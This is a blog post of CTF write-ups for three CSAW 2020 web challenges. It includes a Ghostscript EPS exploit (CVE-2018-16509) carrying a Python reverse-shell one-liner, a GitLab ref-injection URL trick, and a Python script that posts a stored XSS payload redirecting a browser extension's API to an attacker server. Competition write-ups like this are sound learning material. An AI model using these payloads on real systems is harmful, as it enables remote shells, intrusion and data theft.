<!doctype html><html lang=en><head><title>CSAW CTF Finals 2020 Writeups :: silly onions — Opinionated articles</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta name=description content="Al Capwn participated in the online CSAW CTF Finals 2020 from the India region. We stood 6th in the region scoring 2101 points. We did miss going to IIT Kanpur for the offline event, but, nonetheless we had tons of fun!  Web - Picgram - 100  Check out this new photo upload service! Hopefully you won&amp;rsquo;t be able to do anything spooky with it.
http://web.chal.csaw.io:5000
 The challenge downloads contained the server&amp;rsquo;s Dockerfile and Flask server script."><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=/posts/2020-11-09-csaw-ctf-finals-2020-writeup/><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-99588570-3','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/assets/red.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href=/img/favicon/red.png><meta name=twitter:card content="summary"><meta name=twitter:title content="CSAW CTF Finals 2020 Writeups :: silly onions — Opinionated articles"><meta name=twitter:description content="Al Capwn participated in the online CSAW CTF Finals 2020 from the India region. We stood 6th in the region scoring 2101 points. We did miss going to IIT Kanpur for the offline event, but, nonetheless we had tons of fun!  Web - Picgram - 100  Check out this new photo upload service! Hopefully you won&amp;rsquo;t be able to do anything spooky with it.
http://web.chal.csaw.io:5000
 The challenge downloads contained the server&amp;rsquo;s Dockerfile and Flask server script."><meta name=twitter:site content="/"><meta name=twitter:creator content><meta name=twitter:image content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="CSAW CTF Finals 2020 Writeups :: silly onions — Opinionated articles"><meta property="og:description" content="Al Capwn participated in the online CSAW CTF Finals 2020 from the India region. We stood 6th in the region scoring 2101 points. We did miss going to IIT Kanpur for the offline event, but, nonetheless we had tons of fun!  Web - Picgram - 100  Check out this new photo upload service! Hopefully you won&amp;rsquo;t be able to do anything spooky with it.
http://web.chal.csaw.io:5000
 The challenge downloads contained the server&amp;rsquo;s Dockerfile and Flask server script."><meta property="og:url" content="/posts/2020-11-09-csaw-ctf-finals-2020-writeup/"><meta property="og:site_name" content="CSAW CTF Finals 2020 Writeups"><meta property="og:image" content><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:section" content="article"><meta property="article:published_time" content="2020-11-09 00:00:00 +0000 UTC"></head><body><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>sillyonions</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about>About</a></li><li><a href=/books>Books</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about>About</a></li><li><a href=/books>Books</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=/posts/2020-11-09-csaw-ctf-finals-2020-writeup/>CSAW CTF Finals 2020 Writeups</a></h1><div class=post-meta><span class=post-date>2020-11-09</span></div><span class=post-tags>#<a href=/tags/csaw/>csaw</a>&nbsp;
#<a href=/tags/ctf/>ctf</a>&nbsp;</span><div class=post-content><ul><li>Al Capwn participated in the online CSAW CTF Finals 2020 from the India region. We stood 6th in the region scoring 2101 points. We did miss going to IIT Kanpur for the offline event, but, nonetheless we had tons of fun!</li></ul><h1 id=web---picgram---100>Web - Picgram - 100</h1><blockquote><p>Check out this new photo upload service! Hopefully you won&rsquo;t be able to do anything spooky with it.</p><p><a href=http://web.chal.csaw.io>http://web.chal.csaw.io</a>:5000</p></blockquote><p>The challenge downloads contained the server&rsquo;s Dockerfile and Flask server script.</p><p>The server accepted an image in a POST request and echoed a resized version of the same image.</p><p>The Dockerfile builds upon the base image <code>vulhub/ghostscript:9.23-python</code> which is an intentionally vulnerable container image having an older version of the Pillow library (<a href=https://nvd.nist.gov/vuln/detail/CVE-2018-16509>CVE-2018-16509</a>).</p><p>Quick google leads us to the vulhub GitHub repository containing information about the CVE and a convenient exploit payload i.e a JPG image with Ghostcript containing RCE. I modified the RCE to open up a reverse shell to my server and found the flag inside the sqlite database for the app server.</p><pre><code>%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;IP&quot;,5300));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);') currentdevice putdeviceprops
</code></pre><h1 id=web---shark-facts---250>Web - Shark Facts - 250</h1><blockquote><p>Sharks are all the rage right now, so people are craving shark facts. Unfortunately the shark fact maintainer went AWOL and is not accepting pull requests anymore :(</p><p><a href=http://sharks.alternativefacts.systems/>http://sharks.alternativefacts.systems/</a></p></blockquote><p>We are given the challenge URL and the Flask server code. The application can be logged into using GitLab OAuth and creates a private repository containing shark facts for us under their own account with the name <code>shark-facts-for-&lt;username></code>.</p><p>After logging in, the server accepts the GitLab URL of a file to be read from the repository using the GitLab API.<figure class=center><img src=/img/shark-facts-home.png alt="Shark Facts Homepage" style=border><figcaption class=center>Shark Facts Homepage</figcaption></figure></p><p>The server code shows that if the file read contains the string <code>blahaj is life</code>, the flag is returned along with the file. Thus, Our goal is to fetch a file from GitLab with the contents <code>blahaj is life</code>.</p><p>In this challenge we can control the input URL for the file to be read and our GitLab username. The input url by default contains the path of the README.md in the repository containing the Sharky facts.<figure class=center><img src=/img/shark-facts-server.png alt="Shark Facts Server" style=border><figcaption class=center>Server Code</figcaption></figure></p><p>The server code accepted the URL and verified it to be a part of the repository created by the server, thus you cannot pass your own public repositories and the file has to be present in the SharkFacts repository. The URL is checked to be of the form <code>https://gitlab.com/sharkfacts/shark-facts-for-&lt;username>/-/blob/main/&lt;filename></code> and everything beyond /blob/main is passed into the request URL.</p><p>Request URL is generated as: <code>https://gitlab.com/api/v4/projects/&lt;project_name>/repository/files/&lt;filename>/raw?ref=main</code></p><p>The GitLab Files API accepts the repository ref from which to fetch the file from. We can form the input URL in such a way to control the ref to be used.</p><pre><code>filename: README.md/raw?ref=&lt;commit-id&gt;&amp;
final generated URL: https://gitlab.com/api/v4/projects/shark-facts-for-&lt;username&gt;/repository/files/README.md/raw?ref=&lt;commit-id&gt;&amp;/raw?ref=main
</code></pre><p>This final URL allows us to fetch from any ref in the Git repository tree. We do not have write permissions in the GitLab repository but we can create a fork and open a merge request. This creates a branch with our file containing <code>blahaj is life</code> whose commit id we can copy. Submitting the filename with the commit id gives us the flag.</p><figure class=center><img src=/img/shark-facts-flag.png alt="Shark Facts Flag" style=border><figcaption class=center>Shark Facts Flag</figcaption></figure><pre><code>https://gitlab.com/sharkfacts/shark-facts-for-arush15june/-/blob/main/README.md/raw?ref=03f8358719a72efc7c8ed702bc3ddfacfd843231&amp;
</code></pre><p>Flag: <code>flag{Shark Fact #81: 97 Percent of all sharks are completely harmless to humans}</code></p><h1 id=web---comment-anywhere---300>Web - Comment Anywhere - 300</h1><blockquote><p>This is a cool new Chrome extension i&rsquo;m working on which lets you leave a comment anywhere on any page that others using the extension can see. Check it out!</p></blockquote><p>We are given the chrome extension <code>extension.crx</code> and the flask server code <code>app.py</code>. We installed the extension in a Chromium installation running inside an Ubuntu virtual machine and unpacked the CRX extension to get the extension source code.</p><p>The extensions allowed you to comment on a webpage and the comments will be visible to other users of the extension on the same URL and page coordinates. The extension was supposed to open up an input prompt to pass the comment but that never worked for us.</p><p>The server code listed two API routes <code>/comment</code> for making new comments and <code>/comments?url=&lt;url></code> for listing comments for a specific URL. As the API was open, we could list and create new comments for any URL. On requesting the comments for the <code>https://ctf.csaw.io</code> using <code>GET /comments?url=https://ctf.csaw.io</code> we got a few comments with the creator as admin and many XSS payloads from other participants hinting us on how we should proceed. A lot of the payloads were using window.PostMessage to change the configuration of the extension configuring it to change its API server to one controlled by the participants. As the <code>POST /comment</code> API didnt perform any HTML escaping we could pass script tags directly via a POST requests.</p><p>The challenge hint told us to try and see what the admin was doing. We hosted our own API server using the the given server file and comment an XSS payload changing the extension API server via <code>window.PostMessage</code> giving us the requests made by the admin.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> concurrent.futures <span style=color:#f92672>import</span> ThreadPoolExecutor
<span style=color:#f92672>import</span> requests
<span style=color:#f92672>import</span> json

URL <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://comment-anywhere.chal.csaw.io:8000&#34;</span>
url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://ctf.csaw.io/&#34;</span>
<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>do_comment</span>(comm):
  <span style=color:#66d9ef>return</span> requests<span style=color:#f92672>.</span>post(URL<span style=color:#f92672>+</span><span style=color:#e6db74>&#39;/comment&#39;</span>, json<span style=color:#f92672>=</span>{
    <span style=color:#e6db74>&#39;url&#39;</span>:url,
    <span style=color:#e6db74>&#39;coords&#39;</span>: {<span style=color:#e6db74>&#39;x&#39;</span>:<span style=color:#ae81ff>42</span>,<span style=color:#e6db74>&#39;y&#39;</span>:<span style=color:#ae81ff>123</span>},
    <span style=color:#e6db74>&#39;creator&#39;</span>: <span style=color:#e6db74>&#34;shell&#34;</span>,
    <span style=color:#e6db74>&#39;comment&#39;</span>: comm,
  })


<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>do</span>():
  r <span style=color:#f92672>=</span> do_comment(<span style=color:#e6db74>&#34;&#34;&#34;&lt;img src=x onerror=</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>;window.postMessage({type: &#39;commentAnywhereSetCoords&#39;, coords: {type: &#39;setConfig&#39;, key: &#39;api&#39;, value: &#39;http://&lt;SERVER_IP&gt;:8001&#39;}});</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&gt;&#34;&#34;&#34;</span>)
  <span style=color:#66d9ef>print</span>(r, r<span style=color:#f92672>.</span>text)
  rL <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(URL<span style=color:#f92672>+</span><span style=color:#e6db74>&#39;/comments?url=https://ctf.csaw.io/&#39;</span>)
  <span style=color:#66d9ef>try</span>:
    <span style=color:#66d9ef>print</span>(rL<span style=color:#f92672>.</span>text)
    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;&lt;SERVER_IP&gt;&#39;</span> <span style=color:#f92672>in</span> rL<span style=color:#f92672>.</span>text:
      <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#39;GOT&#39;</span>, len(rL<span style=color:#f92672>.</span>json()))
  <span style=color:#66d9ef>except</span>:
    <span style=color:#66d9ef>pass</span>

<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
  <span style=color:#66d9ef>while</span> True:
    futures <span style=color:#f92672>=</span> []
    <span style=color:#66d9ef>with</span> ThreadPoolExecutor(max_workers<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>) <span style=color:#66d9ef>as</span> executor:
      futures<span style=color:#f92672>.</span>append(executor<span style=color:#f92672>.</span>submit(do))
</code></pre></div><p>Once the payload was executed by the admin browser, we started receiving requests from the admin listing comments from many URLs, the flag was part of the URLs being listed by the admin.</p><pre><code>GET /comments?url=https%3A%2F%2Fctf.csaw.io%2Fcomment-anywhere%2Fflag%257Bh0w_many_l%40yers_of_yavaScr1pt_r_u_0n%3F%7D
</code></pre><p>Flag: <code>flag{h0w_many_l@yers_of_yavaScr1pt_r_u_0n?}</code></p></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button next"><a href=/posts/2020-07-12-clocks-timers-virtualization/><span class=button__text>Clocks, Timers and Virtualization</span>
<span class=button__icon>→</span></a></span></div></div><div id=disqus_thread></div><script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return;}
var d=document,s=d.createElement('script');s.async=true;s.src='//'+"arush15june-github-io"+'.disqus.com/embed.js';s.setAttribute('data-timestamp',+new Date());(d.head||d.body).appendChild(s);})();</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>Aarush Ahuja :: 2020</span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=/assets/main.js></script><script src=/assets/prism.js></script></div></body></html>